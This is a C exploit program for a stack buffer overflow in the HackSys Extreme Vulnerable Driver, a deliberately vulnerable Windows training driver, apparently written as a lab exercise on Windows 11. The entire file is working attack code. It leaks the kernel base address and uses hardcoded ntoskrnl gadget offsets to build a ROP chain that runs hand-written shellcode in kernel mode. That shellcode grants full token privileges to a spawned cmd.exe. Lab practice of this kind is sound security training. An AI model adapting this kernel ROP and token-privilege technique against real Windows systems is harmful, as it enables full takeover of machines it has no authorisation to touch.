/*
HEVD TriggerBufferOverflowStack
OS Name	Microsoft Windows 11 Pro
Version	10.0.22631 Build 22631

ntoskrnl Version 10.0.22621.3593
*/

#include <Windows.h>
#include <Psapi.h>
#include <stdio.h>
#include <stdbool.h>

#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define STACK_OVERFLOW_IOCTL_NUMBER     IOCTL(0x800)
#define getName(var)  #var 

// GADGETS
unsigned long long g_xor_ecx_ecx_mov_rax_rcx_ret = 0x00000000002da11a;

unsigned long long g_pop_rdx_ret = 0x0000000000350ba2;
unsigned long long g_pop_rcx_ret = 0x000000000020d810;
unsigned long long g_pop_r8_ret = 0x000000000025bad8;
unsigned long long g_pop_r9_ret = 0x000000000042f0a3;


unsigned long long g_push_rax_ret = 0x0000000000227f61;
unsigned long long g_push_rax_pop_rbx = 0x000000000021efee;
unsigned long long g_push_rax_pop_r13_ret = 0x00000000002f2137;
unsigned long long g_push_0x47_ret = 0x0000000000689d02;

unsigned long long g_mov_rcx_r8_mov_rax_rcx_ret = 0x000000000089d278;
unsigned long long g_mov_cr4_rcx_ret = 0x0000000000399047;
unsigned long long g_mov_ptr_rax_r9_ret = 0x00000000003c84dc;

unsigned long long g_add_rsp_0x20_ret = 0x0000000000af774a;
unsigned long long g_xchg_r8_r13_ret_0xcec2 = 0x000000000061c127;
unsigned long long g_jmp_rbx = 0x000000000023a21d;
unsigned long long g_mov_r8_rax_mov_rax_r8_add_rsp_0x28_ret = 0x000000000052a0e1;

unsigned long long kernel_sysret = 0x0000000000af5e1d;
unsigned long long kernel_ExAllocatePoolWithTag;
unsigned long long kernel_memcpy;

// ELEVATED PROCESS
DWORD pid;

typedef struct sSepTokenPrivileges {
    UINT8 present;
    UINT8 enabled;
    UINT8 enabled_by_default;
} SEP_TOKEN_PRIVILEGES;

typedef NTSTATUS(*_PsLookupProcessByProcessId)(IN HANDLE, OUT PVOID*);
_PsLookupProcessByProcessId kernel_PsLookupProcessByProcessId;

typedef PVOID(*_PsReferencePrimaryToken)(PVOID);
_PsReferencePrimaryToken kernel_PsReferencePrimaryToken;

// Error func
void error_handler(const char* function) {
    printf("[-] Error from %s\n", function);
    long int errorCode = GetLastError();
    LPTSTR errorText = NULL;

    FormatMessage(
        FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&errorText,
        0,
        NULL
    );

    printf("[-] Error (%ld): %ls\n", errorCode, errorText);
    exit(-1);
}

// Gets kernel base addr
unsigned long long get_kernel_base_addr() {
    LPVOID drivers[1024];
    DWORD cbNeeded;

    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);

    return (unsigned long long)drivers[0];
}

PVOID get_kernel_symbol_addr(const char* symbol) {
    PVOID kernelBaseAddr;
    HMODULE userKernelHandle;
    PCHAR functionAddress;
    unsigned long long offset;

    kernelBaseAddr = (PVOID)get_kernel_base_addr();
    userKernelHandle = LoadLibraryA("ntoskrnl.exe");

    if (userKernelHandle == INVALID_HANDLE_VALUE) {
        error_handler("get_kernel_symbol_addr userKernelHandle");
    }

    functionAddress = (PCHAR)GetProcAddress(userKernelHandle, symbol);
    if (functionAddress == NULL) {
        error_handler("get_kernel_symbol_addr functionAddress");
    }

    offset = functionAddress - ((PCHAR)userKernelHandle);
    return (PVOID)(((PCHAR)kernelBaseAddr) + offset);
}

// Get handle to driver
HANDLE get_handle() {
    // Handle to device
    HANDLE hDevice = CreateFileA(
        DEVICE_NAME,
        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE)
        error_handler("get_handle");

    return hDevice;
}

// Add payload
void add_payload(char* in_buffer, SIZE_T* offset, unsigned long long* data, SIZE_T size) {
    memcpy(in_buffer + *offset, data, size);
    printf("[*] Wrote %lx to offset %u\n", *data, *offset);
    *offset += size;
}

// Spawn shell
DWORD spawnCmd() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char cmd[] = "C:\\Windows\\System32\\cmd.exe";

    printf("[+] Command to execute: %s\n", cmd);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Child process
    if (!CreateProcessA(
        cmd,  // Use the command as the application name
        NULL,  // Command line is null since we're specifying the application name
        NULL,
        NULL,
        FALSE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        error_handler("spawnCmd");
    }

    return pi.dwProcessId;
}

// Print hexview
void print_hex_view(char* buffer, size_t size) {
    for (size_t i = 0; i < size; i++) {
        printf("%02hhX ", buffer[i]);
        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
    }
    printf("\n");
}

// Shellcode
char* gen_shellcode() {
    char* shellcode = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x4e + 11); //0x4e+11 is the size of the shellcode
    memcpy(shellcode, "\x48\xc7\xc1\x78\x56\x34\x12\x48\x83\xec\x08\x48\x89\xe2\x48\xbb\x00\x00\x00\x00\xff\xff\xff\xff\xff\xd3\x48\x8b\x0c\x24\x48\xbb\x10\x32\x34\x12\xff\xff\xff\xff\xff\xd3\x48\x83\xc0\x40\x48\xb9\xfc\xff\xff\xff\x00\x00\x00\x00\x48\x89\x08\x48\x83\xc0\x08\x48\x89\x08\x48\x83\xc0\x08\x48\x89\x08\x48\x83\xc4\x08\x48\xBB\xC0\x0D\x02\x1B\x05\xF8\xFF\xFF\xFF\xE3", 0x4e + 11);
    memcpy(shellcode + 3, &pid, 4); // Adjusting the PID
    memcpy(shellcode + 16, &kernel_PsLookupProcessByProcessId, 8); //Adjusting the address for PsLookUpProcessByProcessId function
    memcpy(shellcode + 32, &kernel_PsReferencePrimaryToken, 8); //Adjusting PsReferencePrimaryToken function address
    memcpy(shellcode + 0x4e + 1, &kernel_sysret, 8); // Adjusting sysret function address.
    return shellcode;
}

// Main func
int main() {
    HANDLE hDevice = get_handle();
    printf("[+] Device handle: 0x%p\n", hDevice);

    SIZE_T in_buffer_size = 2072 + 8 * 7 + 0x20 + 0x100; // 2072 is the offset; there are 7 8-byte long gadgets and an add rsp, 0x20.

    // Memory for buffer
    PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);
    memset((char*)in_buffer, 'A', in_buffer_size);
    printf("[+] Buffer allocated\n");

    SIZE_T offset = 2072;

    // Cmd
    pid = spawnCmd();
    printf("[+] Cmd spawned with PID: %d\n", pid);

    // Adjuts offsets
    unsigned long long kernel_base_addr = get_kernel_base_addr();
    printf("[+] Kernel base address: 0x%p\n", kernel_base_addr);

    g_xor_ecx_ecx_mov_rax_rcx_ret += kernel_base_addr;
    g_pop_rdx_ret += kernel_base_addr;
    g_add_rsp_0x20_ret += kernel_base_addr;
    g_push_rax_ret += kernel_base_addr;
    g_push_rax_pop_rbx += kernel_base_addr;
    g_push_0x47_ret += kernel_base_addr;
    g_pop_rcx_ret += kernel_base_addr;
    g_pop_r8_ret += kernel_base_addr;
    g_pop_r9_ret += kernel_base_addr;
    g_mov_rcx_r8_mov_rax_rcx_ret += kernel_base_addr;
    g_mov_ptr_rax_r9_ret += kernel_base_addr;
    g_push_rax_pop_r13_ret += kernel_base_addr;
    g_xchg_r8_r13_ret_0xcec2 += kernel_base_addr;
    g_mov_r8_rax_mov_rax_r8_add_rsp_0x28_ret += kernel_base_addr;
    g_mov_cr4_rcx_ret += kernel_base_addr;
    g_jmp_rbx += kernel_base_addr;
    kernel_sysret += kernel_base_addr;

    kernel_ExAllocatePoolWithTag = (unsigned long long) get_kernel_symbol_addr("ExAllocatePoolWithTag");
    kernel_memcpy = (unsigned long long) get_kernel_symbol_addr("memcpy");
    kernel_PsLookupProcessByProcessId = (_PsLookupProcessByProcessId)get_kernel_symbol_addr("PsLookupProcessByProcessId");
    kernel_PsReferencePrimaryToken = (_PsReferencePrimaryToken)get_kernel_symbol_addr("PsReferencePrimaryToken");

    // Shellcode
    char* shellcode = gen_shellcode();
    printf("[+] Shellcode generated: 0x%p\n", (void*)shellcode);
    print_hex_view(shellcode, 0x4e + 11);

    // Values
    unsigned long long size_of_copy = 0x4e+11; //Arbitrary size of our shellcode
    unsigned long long dummy_data = 0x4141414141414141;

    // Exploit

    // AllocatePoolWithTag()
    add_payload((char*)in_buffer, &offset, &g_xor_ecx_ecx_mov_rax_rcx_ret, 8); // RCX = 0, NonPagedPoolExecute
    add_payload((char*)in_buffer, &offset, &g_pop_rdx_ret, 8);
    add_payload((char*)in_buffer, &offset, &size_of_copy, 8);
    add_payload((char*)in_buffer, &offset, &kernel_ExAllocatePoolWithTag, 8);

    // RCX parameter for memcpy, address of AllocatePoolWithTag
    add_payload((char*)in_buffer, &offset, &g_mov_r8_rax_mov_rax_r8_add_rsp_0x28_ret, 8);
    for (int i = 0; i < 5; i++)
        add_payload(in_buffer, &offset, &dummy_data, 8);
    add_payload((char*)in_buffer, &offset, &g_mov_rcx_r8_mov_rax_rcx_ret, 8);

    /*
    add_payload((char*)in_buffer, &offset, &g_push_rax_pop_rbx, 8);
    add_payload((char*)in_buffer, &offset, &g_push_rax_pop_r13_ret, 8);
    add_payload((char*)in_buffer, &offset, &g_xchg_r8_r13_ret_0xcec2, 8);
    add_payload((char*)in_buffer, &offset, &g_mov_rcx_r8_mov_rax_rcx_ret, 8);
    */

    // RDX parameter for memcpy, address of shellcode
    add_payload((char*)in_buffer, &offset, &g_pop_rdx_ret, 8); 
    add_payload((char*)in_buffer, &offset, (unsigned long long*)(&shellcode), 8);

    // Call memcpy
    add_payload((char*)in_buffer, &offset, &g_pop_r8_ret, 8);
    add_payload((char*)in_buffer, &offset, &size_of_copy, 8);
    add_payload((char*)in_buffer, &offset, &kernel_memcpy, 8);

    
    // Call shelcode
    /*
    
    add_payload((char*)in_buffer, &offset, &g_pop_r9_ret, 8);         // what
    add_payload((char*)in_buffer, &offset, &pte_xd_value, 8);         // Value for PTE
    add_payload((char*)in_buffer, &offset, &g_mov_ptr_rax_r9_ret, 8); // where
    */
    add_payload((char*)in_buffer, &offset, &g_push_rax_pop_rbx, 8); // Save address on rbx
    add_payload((char*)in_buffer, &offset, &g_jmp_rbx, 8);

    /*
    printf("g_xor_ecx_ecx_mov_rax_rcx_ret: 0x%p\n", g_xor_ecx_ecx_mov_rax_rcx_ret);
    printf("g_pop_rdx_ret: 0x%p\n", g_pop_rdx_ret);
    printf("g_add_rsp_0x20_ret: 0x%p\n", g_add_rsp_0x20_ret);
    printf("g_push_rax_ret: 0x%p\n", g_push_rax_ret);
    printf("g_pop_rcx_ret: 0x%p\n", g_pop_rcx_ret);
    printf("g_pop_r8_ret: 0x%p\n", g_pop_r8_ret);
    printf("g_jmp_rbx: 0x%p\n", g_jmp_rbx);
    printf("kernel_sysret: 0x%p\n", kernel_sysret);
    printf("kernel_ExAllocatePoolWithTag: 0x%p\n", kernel_ExAllocatePoolWithTag);
    printf("kernel_memcpy: 0x%p\n", kernel_memcpy);
    printf("kernel_PsLookupProcessByProcessId: 0x%p\n", kernel_PsLookupProcessByProcessId);
    printf("kernel_PsReferencePrimaryToken: 0x%p\n", kernel_PsReferencePrimaryToken);
    printf("shellcode: 0x%p\n", (void*)shellcode);
    */

    system("pause");
    printf("[+] Sending buffer\n");
    bool result = DeviceIoControl(hDevice, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);
    if (!result) {
        error_handler("main BoF");
    }

    HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);

    // End
    printf("[!] Success");
    return 0;
}
